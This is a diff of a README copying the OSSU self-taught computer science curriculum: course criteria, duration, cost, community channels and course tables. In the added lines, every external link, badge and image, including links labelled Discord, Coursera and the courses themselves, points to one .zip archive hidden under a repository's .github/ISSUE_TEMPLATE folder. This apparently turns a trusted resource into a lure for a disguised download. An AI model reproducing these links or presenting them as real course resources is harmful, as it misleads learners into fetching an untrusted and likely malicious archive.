@@ -1,15 +1,15 @@
-![Open Source Society University (OSSU)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+![Open Source Society University (OSSU)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 <h3 align="center">Open Source Society University</h3>
 <p align="center">
   Path to a free self-taught education in Computer Science!
 </p>
 <p align="center">
-  <a href="https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip">
-    <img alt="Awesome" src="https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip">
+  <a href="https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip">
+    <img alt="Awesome" src="https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip">
   </a>
-  <a href="https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip">
-	<img alt="Open Source Society University - Computer Science" src="https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip">
+  <a href="https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip">
+	<img alt="Open Source Society University - Computer Science" src="https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip">
   </a>
 </p>
 
@@ -38,11 +38,11 @@ but specifically chosen to meet the following criteria.
 - Be open for enrollment
 - Run regularly (ideally in self-paced format, otherwise running multiple times per year)
 - Be of generally high quality in teaching materials and pedagogical principles
-- Match the curricular standards of the [CS 2013](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip): Curriculum Guidelines for Undergraduate Degree Programs in Computer Science
+- Match the curricular standards of the [CS 2013](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip): Curriculum Guidelines for Undergraduate Degree Programs in Computer Science
 
 When no course meets the above criteria, the coursework is supplemented with a book.
 When there are courses or books that don't fit into the curriculum but are otherwise of high quality,
-they belong in [extras/courses](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) or [extras/readings](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
+they belong in [extras/courses](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) or [extras/readings](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
 
 **Organization**. The curriculum is designed as follows:
 - *Intro CS*: for students to try out CS and see if it's right for them
@@ -51,37 +51,37 @@ they belong in [extras/courses](https://raw.githubusercontent.com/AvishekInvinci
 - *Final Project*: a project for students to validate, consolidate, and display their knowledge, to be evaluated by their peers worldwide
 
 **Duration**. It is possible to finish within about 2 years if you plan carefully and devote roughly 20 hours/week to your studies. Learners can use [this spreadsheet
-](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) to estimate their end date. Make a copy and input your start date and expected hours per week in the `Timeline` sheet. As you work through courses you can enter your actual course completion dates in the `Curriculum Data` sheet and get updated completion estimates.
+](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) to estimate their end date. Make a copy and input your start date and expected hours per week in the `Timeline` sheet. As you work through courses you can enter your actual course completion dates in the `Curriculum Data` sheet and get updated completion estimates.
 
 **Cost**. All or nearly all course material is available for free. However, some courses may charge money for assignments/tests/projects to be graded.
-Note that both [Coursera](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) and [edX](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) offer financial aid.
+Note that both [Coursera](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) and [edX](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) offer financial aid.
 
 Decide how much or how little to spend based on your own time and budget;
 just remember that you can't purchase success!
 
 **Process**. Students can work through the curriculum alone or in groups, in order or out of order.
 - We recommend doing all courses in Core CS, only skipping a course when you are certain that you've already learned the material previously.
-- For simplicity, we recommend working through courses (especially Core CS) in order from top to bottom, as they have already been [topologically sorted](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) by their prerequisites.
+- For simplicity, we recommend working through courses (especially Core CS) in order from top to bottom, as they have already been [topologically sorted](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) by their prerequisites.
 - Courses in Advanced CS are electives. Choose one subject (e.g. Advanced programming) you want to become an expert in and take all the courses under that heading. You can also create your own custom subject, but we recommend getting validation from the community on the subject you choose.
 
 **Content policy**. If you plan on showing off some of your coursework publicly, you must share only files that you are allowed to.
 *Do NOT disrespect the code of conduct* that you signed in the beginning of each course!
 
-**[How to contribute](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)**
+**[How to contribute](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)**
 
-**[Getting help](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)** (Details about our FAQ and chatroom)
+**[Getting help](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)** (Details about our FAQ and chatroom)
 
 # Community
 
-- We have a discord server! [![Discord](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) This should be your first stop to talk with other OSSU students. Why don't you introduce yourself right now? [Join the OSSU Discord](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-- You can also interact through GitHub issues. If there is a problem with a course, or a change needs to be made to the curriculum, this is the place to start the conversation. Read more [here](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
-- Subscribe to our [newsletter](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
-- Add **Open Source Society University** to your [Linkedin](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) profile!
-- Note: There is an unmaintained and deprecated firebase app that you might find when searching OSSU. You can safely ignore it. Read more in the [FAQ](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
+- We have a discord server! [![Discord](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) This should be your first stop to talk with other OSSU students. Why don't you introduce yourself right now? [Join the OSSU Discord](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+- You can also interact through GitHub issues. If there is a problem with a course, or a change needs to be made to the curriculum, this is the place to start the conversation. Read more [here](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
+- Subscribe to our [newsletter](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
+- Add **Open Source Society University** to your [Linkedin](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) profile!
+- Note: There is an unmaintained and deprecated firebase app that you might find when searching OSSU. You can safely ignore it. Read more in the [FAQ](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
 
 # Curriculum
 
-**Curriculum version**: `8.0.0` (see [CHANGELOG](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip))
+**Curriculum version**: `8.0.0` (see [CHANGELOG](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip))
 
 - [Prerequisites](#prerequisites)
 - [Intro CS](#intro-cs)
@@ -108,7 +108,7 @@ just remember that you can't purchase success!
 
 ## Prerequisites
 
-- [Core CS](#core-cs) assumes the student has already taken [high school math](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip), including algebra, geometry, and pre-calculus.
+- [Core CS](#core-cs) assumes the student has already taken [high school math](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip), including algebra, geometry, and pre-calculus.
 - [Advanced CS](#advanced-cs) assumes the student has already taken the entirety of Core CS
 and is knowledgeable enough now to decide which electives to take.
 - Note that [Advanced systems](#advanced-systems) assumes the student has taken a basic physics course (e.g. AP Physics in high school).
@@ -125,7 +125,7 @@ If you've never written a for-loop, or don't know what a string is in programmin
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Python for Everybody](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 10 weeks | 10 hours/week | none | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Python for Everybody](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 10 weeks | 10 hours/week | none | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ### Introduction to Computer Science
 
@@ -139,7 +139,7 @@ This course will introduce you to the world of computer science. Students who ha
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Introduction to Computer Science and Programming using Python](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) ([alt](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)) | 9 weeks | 15 hours/week | [high school algebra](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Introduction to Computer Science and Programming using Python](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) ([alt](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)) | 9 weeks | 15 hours/week | [high school algebra](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ## Core CS
 
@@ -162,14 +162,14 @@ All coursework under Core CS is **required**, unless otherwise indicated.
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[How to Code - Simple Data](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) [(textbook)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 7 weeks | 8-10 hours/week | none | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[How to Code - Complex Data](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 6 weeks | 8-10 hours/week | How to Code: Simple Data | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Programming Languages, Part A](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 5 weeks | 4-8 hours/week | How to Code ([Hear instructor](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Programming Languages, Part B](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 3 weeks | 4-8 hours/week | Programming Languages, Part A | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Programming Languages, Part C](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 3 weeks | 4-8 hours/week | Programming Languages, Part B | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Object-Oriented Design](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 4 hours/week | [Basic Java](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Design Patterns](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 4 hours/week | Object-Oriented Design
-[Software Architecture](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 2-5 hours/week | Design Patterns
+[How to Code - Simple Data](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) [(textbook)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 7 weeks | 8-10 hours/week | none | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[How to Code - Complex Data](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 6 weeks | 8-10 hours/week | How to Code: Simple Data | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Programming Languages, Part A](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 5 weeks | 4-8 hours/week | How to Code ([Hear instructor](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Programming Languages, Part B](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 3 weeks | 4-8 hours/week | Programming Languages, Part A | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Programming Languages, Part C](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 3 weeks | 4-8 hours/week | Programming Languages, Part B | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Object-Oriented Design](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 4 hours/week | [Basic Java](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Design Patterns](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 4 hours/week | Object-Oriented Design
+[Software Architecture](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 2-5 hours/week | Design Patterns
 
 ### Core math
 Discrete math (Math for CS) is a prerequisite and closely related to the study of algorithms and data structures. Calculus both prepares students for discrete math and helps students develop mathematical maturity.
@@ -184,10 +184,10 @@ Discrete math (Math for CS) is a prerequisite and closely related to the study o
 
 Courses | Duration | Effort | Notes | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--: | :--:
-[Calculus 1A: Differentiation](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+18.01.1x+2T2019/about) ([alt](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)) | 13 weeks | 6-10 hours/week | The alternate covers this and the following 2 courses | [high school math](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Calculus 1B: Integration](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+18.01.2x+3T2019/about) | 13 weeks | 5-10 hours/week | - | Calculus 1A | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Calculus 1C: Coordinate Systems & Infinite Series](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+18.01.3x+1T2020/about) | 6 weeks | 5-10 hours/week | - | Calculus 1B | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Mathematics for Computer Science](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+6.042J+2T2019/about) ([alt](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)) | 13 weeks | 5 hours/week | [2015/2019 solutions](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) [2010 solutions](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) [2005 solutions](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip). | Calculus 1C | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Calculus 1A: Differentiation](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+18.01.1x+2T2019/about) ([alt](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)) | 13 weeks | 6-10 hours/week | The alternate covers this and the following 2 courses | [high school math](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Calculus 1B: Integration](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+18.01.2x+3T2019/about) | 13 weeks | 5-10 hours/week | - | Calculus 1A | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Calculus 1C: Coordinate Systems & Infinite Series](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+18.01.3x+1T2020/about) | 6 weeks | 5-10 hours/week | - | Calculus 1B | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Mathematics for Computer Science](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+6.042J+2T2019/about) ([alt](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)) | 13 weeks | 5 hours/week | [2015/2019 solutions](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) [2010 solutions](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) [2005 solutions](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip). | Calculus 1C | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 
 ### CS Tools
@@ -202,7 +202,7 @@ Understanding theory is important, but you will also be expected to create progr
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[The Missing Semester of Your CS Education](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 2 weeks | 12 hours/week | - | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[The Missing Semester of Your CS Education](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 2 weeks | 12 hours/week | - | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ### Core systems
 
@@ -224,10 +224,10 @@ Courses | Duration | Effort | Prerequisites | Discussion
 
 Courses | Duration | Effort | Additional Text / Assignments| Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--: | :--:
-[Build a Modern Computer from First Principles: From Nand to Tetris](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) ([alt](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)) | 6 weeks | 7-13 hours/week | - | C-like programming language | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Build a Modern Computer from First Principles: Nand to Tetris Part II ](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 6 weeks | 12-18 hours/week | - | one of [these programming languages](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip), From Nand to Tetris Part I | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Operating Systems: Three Easy Pieces](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 10-12 weeks | 6-10 hours/week | - | Nand to Tetris Part II | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Computer Networking: a Top-Down Approach](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 8 weeks | 4–12 hours/week | [Wireshark Labs](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | algebra, probability, basic CS | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Build a Modern Computer from First Principles: From Nand to Tetris](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) ([alt](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)) | 6 weeks | 7-13 hours/week | - | C-like programming language | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Build a Modern Computer from First Principles: Nand to Tetris Part II ](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 6 weeks | 12-18 hours/week | - | one of [these programming languages](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip), From Nand to Tetris Part I | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Operating Systems: Three Easy Pieces](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 10-12 weeks | 6-10 hours/week | - | Nand to Tetris Part II | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Computer Networking: a Top-Down Approach](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 8 weeks | 4–12 hours/week | [Wireshark Labs](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | algebra, probability, basic CS | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ### Core theory
 
@@ -246,10 +246,10 @@ Courses | Duration | Effort | Additional Text / Assignments| Prerequisites | Dis
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Divide and Conquer, Sorting and Searching, and Randomized Algorithms](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 4-8 hours/week | any programming language, Mathematics for Computer Science | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Graph Search, Shortest Paths, and Data Structures](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 4-8 hours/week | Divide and Conquer, Sorting and Searching, and Randomized Algorithms | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Greedy Algorithms, Minimum Spanning Trees, and Dynamic Programming](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 4-8 hours/week | Graph Search, Shortest Paths, and Data Structures | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Shortest Paths Revisited, NP-Complete Problems and What To Do About Them](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 4-8 hours/week | Greedy Algorithms, Minimum Spanning Trees, and Dynamic Programming | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Divide and Conquer, Sorting and Searching, and Randomized Algorithms](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 4-8 hours/week | any programming language, Mathematics for Computer Science | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Graph Search, Shortest Paths, and Data Structures](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 4-8 hours/week | Divide and Conquer, Sorting and Searching, and Randomized Algorithms | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Greedy Algorithms, Minimum Spanning Trees, and Dynamic Programming](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 4-8 hours/week | Graph Search, Shortest Paths, and Data Structures | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Shortest Paths Revisited, NP-Complete Problems and What To Do About Them](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 4-8 hours/week | Greedy Algorithms, Minimum Spanning Trees, and Dynamic Programming | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ### Core security
 **Topics covered**
@@ -263,16 +263,16 @@ Courses | Duration | Effort | Prerequisites | Discussion
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Cybersecurity Fundamentals](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 8 weeks | 10-12 hours/week | - | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Principles of Secure Coding](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 4 weeks | 4 hours/week | - | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Identifying Security Vulnerabilities](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 4 hours/week | - | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Cybersecurity Fundamentals](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 8 weeks | 10-12 hours/week | - | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
